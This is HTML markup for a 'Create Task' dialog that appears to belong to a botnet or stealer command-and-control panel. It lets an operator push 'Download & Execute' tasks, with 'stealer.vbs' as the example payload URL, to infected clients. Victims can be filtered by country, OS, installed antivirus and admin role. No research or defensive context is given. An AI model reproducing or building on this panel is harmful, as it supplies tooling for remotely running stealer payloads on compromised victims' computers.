<div class="modal fade createTask-modal" tabindex="-1" role="dialog" aria-labelledby="createTask" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
        <form action="#" id="createTaskForm">
            <div class="modal-header">
                <h5 class="modal-title font-black">Create Task</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fal fa-times"></i></button>
            </div>
            <div class="modal-body pr-5">

                <div class="row form-group">
                    <div class="col-sm-4 text-right">
                        <label class="control-label text-secondary mb-0">Name:</label>
                    </div>
                    <div class="col-sm-8">
                        <input class="form-control" type="text" name="title" placeholder="Task #9" required>
                    </div>
                </div>

                <div class="row form-group">
                    <div class="col-sm-4 text-right">
                        <label class="control-label text-secondary mb-0">Type:</label>
                    </div>
                    <div class="col-sm-8">
                        <select class="custom-select form-control" name="type" placeholder="Select">
                        <option>Download & Execute</option>
                        <option>Execute</option>
                        <option>Terminate</option>
                        </select>
                    </div>
                </div>

                <div class="row form-group">
                    <div class="col-sm-4 text-right">
                        <label class="control-label text-secondary mb-0">Content:</label>
                    </div>
                    <div class="col-sm-8">
                        <input class="form-control" type="text" name="content" placeholder="http://example.com/stealer.vbs">
                    </div>
                </div>

                <div class="row form-group">
                    <div class="col-sm-4 text-right">
                        <label class="control-label text-secondary mb-0">Target:</label>
                    </div>
                    <div class="col-sm-8">
                        <div class="custom-control custom-radio custom-control-inline" data-toggle="collapse" data-target="#collapseCustomTargets" aria-expanded="false" aria-controls="collapseCustomTargets">
                            <input type="radio" id="targetRadio1" name="target" class="custom-control-input" value="All" checked>
                            <label class="custom-control-label" for="targetRadio1">All</label>
                        </div>
                        <div class="custom-control custom-radio custom-control-inline" id="customTargets" data-toggle="collapse" data-target="#collapseCustomTargets" aria-expanded="false" aria-controls="collapseCustomTargets">
                            <input type="radio" id="targetRadio2" name="target" class="custom-control-input" value="Custom">
                            <label class="custom-control-label" for="targetRadio2">Custom</label>
                        </div>
                    </div>
                </div>

                <div id="collapseCustomTargets" class="collapse" aria-labelledby="customTargets" data-parent=".modal-body">

                    <div class="row form-group">
                        <div class="col-sm-4 text-right">
                            <label class="control-label text-secondary mb-0">Limit:</label>
                        </div>
                        <div class="col-sm-8">
                            <input class="form-control" type="text" name="limit" placeholder="1000">
                        </div>
                    </div>

                    <div class="row form-group">
                        <div class="col-sm-4 text-right">
                            <label class="control-label text-secondary mb-0">Client ID:</label>
                        </div>
                        <div class="col-sm-8">
                            <input class="form-control" type="text" name="client_id" placeholder="13, 45, 63">
                        </div>
                    </div>

                    <div class="row form-group">
                        <div class="col-sm-4 text-right">
                            <label class="control-label text-secondary mb-0">Location:</label>
                        </div>
                        <div class="col-sm-8">
                            <input class="form-control" type="text" name="location" placeholder="US, BR, RU">
                        </div>
                    </div>

                    <div class="row form-group">
                        <div class="col-sm-4 text-right">
                            <label class="control-label text-secondary mb-0">OS:</label>
                        </div>
                        <div class="col-sm-8">
                            <input class="form-control" type="text" name="os" placeholder="Windows 10">
                        </div>
                    </div>

                    <div class="row form-group">
                        <div class="col-sm-4 text-right">
                            <label class="control-label text-secondary mb-0">Antivirus:</label>
                        </div>
                        <div class="col-sm-8">
                            <input class="form-control" type="text" name="antivirus" placeholder="Kaspersky Internet Security">
                        </div>
                    </div>

                    <div class="row form-group">
                        <div class="col-sm-4 text-right">
                            <label class="control-label text-secondary mb-0">Storage:</label>
                        </div>
                        <div class="col-sm-8">
                            <div class="input-group">
                                <div class="input-group-prepend">
                                    <select class="custom-select form-control" name="storage_type" placeholder="Select">
                                        <option>Include</option>
                                        <option>Exclude</option>
                                    </select>
                                </div>
                                <input class="form-control" type="text" name="storage" placeholder="500-2000">
                            </div>
                        </div>
                    </div>

                    <div class="row form-group">
                        <div class="col-sm-4 text-right">
                            <label class="control-label text-secondary mb-0">Network:</label>
                        </div>
                        <div class="col-sm-8">
                            <div class="input-group">
                                <div class="input-group-prepend">
                                    <select class="custom-select form-control" name="network_type" placeholder="Select">
                                        <option>Include</option>
                                        <option>Exclude</option>
                                    </select>
                                </div>
                                <input class="form-control" type="text" name="network" placeholder="5-10">
                            </div>
                        </div>
                    </div>

                    <div class="row form-group">
                        <div class="col-sm-4 text-right">
                            <label class="control-label text-secondary mb-0">Role:</label>
                        </div>
                        <div class="col-sm-8">
                            <select class="custom-select form-control" name="role" placeholder="Select">
                                <option>Any</option>
                                <option>Admin</option>
                                <option>User</option>
                            </select>
                        </div>
                    </div>

                </div>

                <div class="row form-group">
                    <div class="col-sm-4 text-right">
                        <label class="control-label text-secondary mb-0">Trigger:</label>
                    </div>
                    <div class="col-sm-8">
                        <div class="custom-control custom-radio custom-control-inline">
                            <input type="radio" id="triggerRadio1" name="trigger" class="custom-control-input" value="Every Client" checked>
                            <label class="custom-control-label" for="triggerRadio1">Every Client</label>
                        </div>
                        <div class="custom-control custom-radio custom-control-inline">
                            <input type="radio" id="triggerRadio2" name="trigger" class="custom-control-input" value="On Connect">
                            <label class="custom-control-label" for="triggerRadio2">On Connect</label>
                        </div>
                    </div>
                </div>

                <div class="row form-group">
                    <div class="col-sm-4 text-right">
                        <label class="control-label text-secondary mb-0">Initial State:</label>
                    </div>
                    <div class="col-sm-8">
                        <select class="custom-select form-control" name="status" placeholder="Select">
                            <option>Active</option>
                            <option>Paused</option>
                        </select>
                    </div>
                </div>

            </div>
            <div class="modal-footer">
                <button type="submit" class="btn btn-primary btn-center ripple text-uppercase">Create</button>
            </div>
        </form>
    </div>
  </div>
</div>